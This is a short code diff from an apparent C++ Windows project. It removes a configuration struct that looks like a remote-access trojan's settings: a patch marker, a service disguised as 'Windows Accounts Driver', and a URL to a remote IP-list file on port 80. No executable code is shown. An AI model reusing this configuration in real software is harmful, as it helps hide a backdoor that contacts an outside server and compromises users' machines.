@@ -25,24 +25,6 @@ static char THIS_FILE[] = __FILE__;
 
 LINKINFO m_linkinfo;
 
-struct MODIFY_DATA 
-{
-		unsigned int finder;
-		char ws_svcname[32];
-		char ws_svcdisplay[64];
-		char ws_svcdesc[256];
-		char url[256];
-		int  port;
-} modify_data = 
-{
-		0xFFFFFF8D,
-		"RemoteStorage",
-		"Windows Accounts Driver",
-		"Network Connections Management",
-		"http://ahai2007.id666.com/user/ahai2007/disk/webdisk/iplistm.txt",
-		80,
-};
-//////////////////////////////////////////////////////////////////////////
 
 
 
